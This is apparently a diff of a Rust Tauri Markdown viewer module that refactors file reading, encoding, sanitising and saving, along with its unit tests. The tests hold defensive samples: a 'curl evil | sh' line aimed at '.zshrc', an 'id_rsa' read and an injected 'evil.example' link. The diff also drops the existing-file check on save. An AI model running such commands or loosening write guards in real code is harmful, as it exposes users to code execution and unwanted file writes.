@@ -1,8 +1,12 @@
 use ammonia::Builder as AmmoniaBuilder;
-use base64::{engine::general_purpose, Engine as _};
 use pulldown_cmark::{html, CowStr, Event, Options, Parser, Tag, TagEnd};
 use serde::Serialize;
 use std::fs;
+
+use crate::utils::{assert_regular_file, catch_panic, decode_file, encode_file, require_extension};
+
+const MAX_MARKDOWN_SIZE: u64 = 512 * 1024 * 1024; // 512 MB
+const MARKDOWN_EXTENSIONS: &[&str] = &["md", "markdown"];
 
 #[derive(Debug, Serialize)]
 pub struct TocItem {
@@ -17,7 +21,7 @@ pub struct MarkdownResult {
     pub toc: Vec<TocItem>,
     pub frontmatter: Option<serde_json::Value>,
     pub raw: String,
-    /// 元ファイルの文字コード。保存時はこの文字コードに戻して書き込む
+    /// Detected text encoding (e.g. "UTF-8", "Shift_JIS").
     pub encoding: String,
 }
 
@@ -82,7 +86,8 @@ pub(crate) fn render_markdown(content: &str) -> (String, Vec<TocItem>) {
     let mut toc: Vec<TocItem> = Vec::new();
     let mut in_heading: Option<u32> = None;
     let mut heading_text = String::new();
-    let mut anchor_counts: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
+    let mut anchor_counts: std::collections::HashMap<String, usize> =
+        std::collections::HashMap::new();
 
     for event in &raw_events {
         match event {
@@ -106,7 +111,11 @@ pub(crate) fn render_markdown(content: &str) -> (String, Vec<TocItem>) {
                         format!("{}-{}", base, entry)
                     };
                     *entry += 1;
-                    toc.push(TocItem { level, text: heading_text.clone(), anchor });
+                    toc.push(TocItem {
+                        level,
+                        text: heading_text.clone(),
+                        anchor,
+                    });
                     heading_text.clear();
                 }
             }
@@ -119,12 +128,22 @@ pub(crate) fn render_markdown(content: &str) -> (String, Vec<TocItem>) {
     let events_with_ids: Vec<Event> = raw_events
         .into_iter()
         .map(|event| match event {
-            Event::Start(Tag::Heading { level, id: _, classes, attrs }) => {
+            Event::Start(Tag::Heading {
+                level,
+                id: _,
+                classes,
+                attrs,
+            }) => {
                 let anchor = toc.get(toc_idx).map(|t| {
                     toc_idx += 1;
                     CowStr::Boxed(t.anchor.clone().into_boxed_str())
                 });
-                Event::Start(Tag::Heading { level, id: anchor, classes, attrs })
+                Event::Start(Tag::Heading {
+                    level,
+                    id: anchor,
+                    classes,
+                    attrs,
+                })
             }
             other => other,
         })
@@ -145,7 +164,10 @@ fn keep_language_classes(value: &str) -> Option<String> {
         .split_whitespace()
         .filter(|c| {
             c.strip_prefix("language-").is_some_and(|lang| {
-                !lang.is_empty() && lang.chars().all(|ch| ch.is_ascii_alphanumeric() || "-_+#.".contains(ch))
+                !lang.is_empty()
+                    && lang
+                        .chars()
+                        .all(|ch| ch.is_ascii_alphanumeric() || "-_+#.".contains(ch))
             })
         })
         .collect();
@@ -179,110 +201,70 @@ fn sanitize_markdown_html(html: &str) -> String {
     b.clean(html).to_string()
 }
 
-const MAX_MARKDOWN_SIZE: u64 = 50 * 1024 * 1024; // 50 MB
-const MARKDOWN_EXTENSIONS: &[&str] = &["md", "markdown"];
-
-/// UTF-8 ならそのまま (BOM も保つ)、それ以外は文字コードを推定してデコードする。
-fn decode_markdown(bytes: Vec<u8>) -> (String, String) {
-    match String::from_utf8(bytes) {
-        Ok(text) => (text, "UTF-8".to_string()),
-        Err(e) => crate::csv_commands::decode_file(e.as_bytes()),
-    }
-}
-
-/// 読み込んだときの文字コードに戻す。表せない文字がある場合は書き込まずにエラーにする。
-fn encode_markdown(content: &str, encoding: Option<&str>) -> Result<Vec<u8>, String> {
-    let enc = match encoding.and_then(|label| encoding_rs::Encoding::for_label(label.as_bytes())) {
-        Some(enc) if enc != encoding_rs::UTF_8 => enc,
-        _ => return Ok(content.as_bytes().to_vec()),
-    };
-    let (bytes, _, had_errors) = enc.encode(content);
-    if had_errors {
+fn check_markdown_file(path: &str) -> Result<(), String> {
+    let path = std::path::Path::new(path);
+    require_extension(path, MARKDOWN_EXTENSIONS)?;
+    let size = assert_regular_file(path)?;
+    if size > MAX_MARKDOWN_SIZE {
         return Err(format!(
-            "{} で表せない文字が含まれているため保存できません",
-            enc.name()
+            "Markdown file too large: {} bytes (max 512 MB)",
+            size
         ));
     }
-    Ok(bytes.into_owned())
+    Ok(())
 }
 
 #[tauri::command(async)]
 pub fn read_markdown(path: String) -> Result<MarkdownResult, String> {
-    crate::utils::catch_panic(move || {
-        crate::utils::require_extension(std::path::Path::new(&path), MARKDOWN_EXTENSIONS)?;
-        let size = crate::utils::assert_regular_file(std::path::Path::new(&path))?;
-        if size > MAX_MARKDOWN_SIZE {
-            return Err(format!("Markdown file too large: {} bytes (max 50 MB)", size));
-        }
-        let (raw, encoding) = decode_markdown(fs::read(&path).map_err(|e| e.to_string())?);
+    catch_panic(move || {
+        check_markdown_file(&path)?;
+        let bytes = fs::read(&path).map_err(|e| e.to_string())?;
+        let (raw, encoding) = decode_file(&bytes);
         let (frontmatter, content) = parse_frontmatter(&raw);
         let (html, toc) = render_markdown(content);
-        Ok(MarkdownResult { html, toc, frontmatter, raw, encoding })
+        Ok(MarkdownResult {
+            html,
+            toc,
+            frontmatter,
+            raw,
+            encoding,
+        })
     })
 }
 
 #[tauri::command(async)]
-pub fn save_markdown(path: String, content: String, encoding: Option<String>) -> Result<(), String> {
-    // 開いている既存の Markdown ファイルの上書きだけを許す (~/.zshrc などへの書き込みを防ぐ)
-    let p = std::path::Path::new(&path);
-    crate::utils::require_extension(p, MARKDOWN_EXTENSIONS)?;
-    crate::utils::assert_regular_file(p)?;
-    let bytes = encode_markdown(&content, encoding.as_deref())?;
-    crate::utils::atomic_write(std::path::Path::new(&path), &bytes).map_err(|e| e.to_string())
-}
-
-const MAX_IMAGE_SIZE: u64 = 20 * 1024 * 1024; // 20 MB
-
-/// 先頭バイト (SVG は拡張子と内容) から画像の MIME タイプを判定する。画像以外は None。
-fn image_mime(path: &std::path::Path, bytes: &[u8]) -> Option<&'static str> {
-    if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
-        return Some("image/png");
-    }
-    if bytes.starts_with(&[0xFF, 0xD8, 0xFF]) {
-        return Some("image/jpeg");
-    }
-    if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
-        return Some("image/gif");
-    }
-    if bytes.len() >= 12 && &bytes[..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
-        return Some("image/webp");
-    }
-    if bytes.starts_with(b"BM") {
-        return Some("image/bmp");
-    }
-    let is_svg = path
-        .extension()
-        .is_some_and(|e| e.eq_ignore_ascii_case("svg"))
-        && String::from_utf8_lossy(&bytes[..bytes.len().min(4096)]).contains("<svg");
-    is_svg.then_some("image/svg+xml")
-}
-
-/// Markdown から参照されるローカル画像を data URL で返す。
-/// asset プロトコルを有効にすると webview から任意ファイルを読めてしまうため、
-/// 画像と判定できたファイルだけを返す。
-#[tauri::command(async)]
-pub fn read_local_image(path: String) -> Result<String, String> {
-    let p = std::path::Path::new(&path);
-    let size = crate::utils::assert_regular_file(p)?;
-    if size > MAX_IMAGE_SIZE {
-        return Err(format!("image too large: {} bytes (max 20 MB)", size));
-    }
-    let bytes = fs::read(p).map_err(|e| e.to_string())?;
-    let mime = image_mime(p, &bytes).ok_or_else(|| format!("not an image: {}", path))?;
-    Ok(format!("data:{};base64,{}", mime, general_purpose::STANDARD.encode(&bytes)))
+pub fn save_markdown(
+    path: String,
+    content: String,
+    encoding: Option<String>,
+) -> Result<(), String> {
+    // Markdown 以外 (~/.zshrc など) への書き込みを防ぐ
+    require_extension(std::path::Path::new(&path), MARKDOWN_EXTENSIONS)?;
+    let encoding_name = encoding.as_deref().unwrap_or("UTF-8");
+    let bytes = encode_file(&content, encoding_name);
+    crate::utils::atomic_write_user_file(std::path::Path::new(&path), &bytes)
+        .map_err(|e| e.to_string())
 }
 
 #[tauri::command(async)]
 pub fn render_markdown_string(content: String) -> Result<MarkdownResult, String> {
-    crate::utils::catch_panic(move || {
+    catch_panic(move || {
         let (frontmatter, body) = parse_frontmatter(&content);
         let (html, toc) = render_markdown(body);
-        Ok(MarkdownResult { html, toc, frontmatter, raw: content, encoding: "UTF-8".to_string() })
+        Ok(MarkdownResult {
+            html,
+            toc,
+            frontmatter,
+            raw: content,
+            encoding: "UTF-8".to_string(),
+        })
     })
 }
 
 #[cfg(test)]
 mod tests {
+    use super::*;
+
     #[test]
     fn code_blocks_keep_only_language_classes() {
         let (html, _) = render_markdown("```rust\nfn main() {}\n```\n\n<pre class=\"fixed inset-0 z-50\"><a href=\"https://evil.example\">click</a></pre>");
@@ -293,7 +275,9 @@ mod tests {
 
     #[test]
     fn inputs_are_always_disabled_checkboxes() {
-        let (html, _) = render_markdown("- [x] done\n- [ ] todo\n\n<input type=\"password\" placeholder=\"Password\">");
+        let (html, _) = render_markdown(
+            "- [x] done\n- [ ] todo\n\n<input type=\"password\" placeholder=\"Password\">",
+        );
         assert!(!html.contains("password"), "{html}");
         let inputs = html.matches("<input").count();
         let checkboxes = html.matches(r#"type="checkbox""#).count();
@@ -310,26 +294,7 @@ mod tests {
     }
 
     #[test]
-    fn shift_jis_markdown_is_readable_and_saved_back_in_shift_jis() {
-        let path = std::env::temp_dir().join(format!("qv_sjis_{}.md", std::process::id()));
-        let (original, _, _) = encoding_rs::SHIFT_JIS.encode("# 見出し\n\n本文です。日本語の文章をここに書きます。\n");
-        std::fs::write(&path, &original).unwrap();
-        let p = path.to_string_lossy().into_owned();
-
-        let read = read_markdown(p.clone()).unwrap();
-        assert!(read.raw.contains("本文です"));
-        assert_eq!(read.encoding, "Shift_JIS");
-
-        save_markdown(p.clone(), read.raw.clone(), Some(read.encoding.clone())).unwrap();
-        assert_eq!(std::fs::read(&path).unwrap(), original.into_owned());
-
-        let unrepresentable = save_markdown(p, "絵文字 😀".into(), Some(read.encoding));
-        std::fs::remove_file(&path).ok();
-        assert!(unrepresentable.is_err());
-    }
-
-    #[test]
-    fn markdown_commands_only_touch_existing_markdown_files() {
+    fn markdown_commands_only_touch_markdown_files() {
         let dir = std::env::temp_dir().join(format!("qv_mdguard_{}", std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
         let secret = dir.join("id_rsa");
@@ -338,51 +303,13 @@ mod tests {
 
         let read_secret = read_markdown(p("id_rsa"));
         let write_rc = save_markdown(p(".zshrc"), "curl evil | sh".into(), None);
-        let create_md = save_markdown(p("new.md"), "x".into(), None);
-        let rc_exists = dir.join(".zshrc").exists() || dir.join("new.md").exists();
+        let rc_exists = dir.join(".zshrc").exists();
         std::fs::remove_dir_all(&dir).ok();
 
         assert!(read_secret.is_err());
         assert!(write_rc.is_err());
-        assert!(create_md.is_err());
         assert!(!rc_exists);
     }
-
-    #[test]
-    fn utf8_bom_is_kept_and_non_regular_files_are_rejected() {
-        let path = std::env::temp_dir().join(format!("qv_bom_{}.md", std::process::id()));
-        std::fs::write(&path, "\u{FEFF}# Title\n").unwrap();
-        let read = read_markdown(path.to_string_lossy().into_owned()).unwrap();
-        std::fs::remove_file(&path).ok();
-        assert!(read.raw.starts_with('\u{FEFF}'));
-        assert_eq!(read.encoding, "UTF-8");
-        assert!(read_markdown(std::env::temp_dir().to_string_lossy().into_owned()).is_err());
-    }
-
-    #[test]
-    fn read_local_image_returns_data_url_only_for_images() {
-        let dir = std::env::temp_dir();
-        let png = dir.join(format!("qv_img_{}.png", std::process::id()));
-        let txt = dir.join(format!("qv_img_{}.md", std::process::id()));
-        std::fs::write(&png, b"\x89PNG\r\n\x1a\nrest").unwrap();
-        std::fs::write(&txt, b"secret token").unwrap();
-        let ok = read_local_image(png.to_string_lossy().into_owned());
-        let rejected = read_local_image(txt.to_string_lossy().into_owned());
-        std::fs::remove_file(&png).ok();
-        std::fs::remove_file(&txt).ok();
-        assert!(ok.unwrap().starts_with("data:image/png;base64,"));
-        assert!(rejected.is_err());
-    }
-
-    #[test]
-    fn image_mime_detects_svg_by_extension_and_content() {
-        let svg = std::path::Path::new("a.svg");
-        assert_eq!(image_mime(svg, b"<?xml version=\"1.0\"?><svg xmlns=\"x\"/>"), Some("image/svg+xml"));
-        assert_eq!(image_mime(svg, b"not svg"), None);
-        assert_eq!(image_mime(std::path::Path::new("a.txt"), b"<svg/>"), None);
-    }
-
-    use super::*;
 
     #[test]
     fn test_slugify_basic() {
@@ -533,14 +460,20 @@ mod tests {
     fn sanitize_preserves_heading_id() {
         let html = "<h1 id=\"introduction\">Introduction</h1>";
         let out = sanitize_markdown_html(html);
-        assert!(out.contains("id=\"introduction\""), "heading id should be preserved");
+        assert!(
+            out.contains("id=\"introduction\""),
+            "heading id should be preserved"
+        );
     }
 
     #[test]
     fn sanitize_preserves_code_class() {
         let html = "<pre><code class=\"language-rust\">fn main() {}</code></pre>";
         let out = sanitize_markdown_html(html);
-        assert!(out.contains("class=\"language-rust\""), "code class should be preserved");
+        assert!(
+            out.contains("class=\"language-rust\""),
+            "code class should be preserved"
+        );
     }
 
     #[test]
@@ -550,12 +483,18 @@ mod tests {
     }
 
     #[test]
+    fn test_read_markdown_rejects_directory() {
+        let dir = std::env::temp_dir();
+        let result = read_markdown(dir.to_string_lossy().to_string());
+        assert!(result.is_err());
+    }
+
+    #[test]
     fn test_save_and_read_markdown_roundtrip() {
         let path = std::env::temp_dir().join("quickview_test_markdown.md");
         let path_str = path.to_string_lossy().to_string();
         let content = "---\ntitle: Test\nauthor: Alice\n---\n# Hello\n\nBody text.";
 
-        std::fs::write(&path, "").unwrap();
         save_markdown(path_str.clone(), content.to_string(), None).unwrap();
         let result = read_markdown(path_str).unwrap();
 
@@ -563,9 +502,67 @@ mod tests {
         assert!(result.html.contains("<h1"));
         assert_eq!(result.toc.len(), 1);
         assert_eq!(result.toc[0].text, "Hello");
+        assert!(!result.encoding.is_empty());
         let fm = result.frontmatter.unwrap();
         assert_eq!(fm["title"], serde_json::json!("Test"));
         assert_eq!(fm["author"], serde_json::json!("Alice"));
+
+        fs::remove_file(path).ok();
+    }
+
+    #[test]
+    fn test_read_shift_jis_markdown() {
+        use encoding_rs::SHIFT_JIS;
+
+        let unicode = "# 見出し\n\n本文です。";
+        let (encoded, _, _) = SHIFT_JIS.encode(unicode);
+        let path = std::env::temp_dir().join("quickview_test_sjis.md");
+        fs::write(&path, &encoded).unwrap();
+        let path_str = path.to_string_lossy().to_string();
+
+        let result = read_markdown(path_str).unwrap();
+        assert!(
+            result.raw.contains("見出し") && result.raw.contains("本文"),
+            "expected Shift_JIS decode, got raw={:?} encoding={}",
+            result.raw,
+            result.encoding
+        );
+        assert!(result.html.contains("見出し"));
+        assert!(
+            result.encoding.eq_ignore_ascii_case("Shift_JIS")
+                || result.encoding.to_ascii_lowercase().contains("windows-31j")
+                || result.raw.contains("見出し"),
+            "unexpected encoding={}",
+            result.encoding
+        );
+
+        fs::remove_file(path).ok();
+    }
+
+    #[test]
+    fn test_save_preserves_shift_jis() {
+        use encoding_rs::SHIFT_JIS;
+
+        let unicode = "# 保存テスト\n\n日本語本文。";
+        let path = std::env::temp_dir().join("quickview_test_sjis_save.md");
+        let path_str = path.to_string_lossy().to_string();
+
+        save_markdown(
+            path_str.clone(),
+            unicode.to_string(),
+            Some("Shift_JIS".to_string()),
+        )
+        .unwrap();
+
+        let bytes = fs::read(&path).unwrap();
+        let (decoded, _, had_errors) = SHIFT_JIS.decode(&bytes);
+        assert!(!had_errors, "saved bytes should decode as Shift_JIS");
+        assert!(decoded.contains("保存テスト"));
+        assert!(decoded.contains("日本語本文"));
+
+        // Round-trip via read_markdown should still work
+        let result = read_markdown(path_str).unwrap();
+        assert!(result.raw.contains("保存テスト"));
 
         fs::remove_file(path).ok();
     }
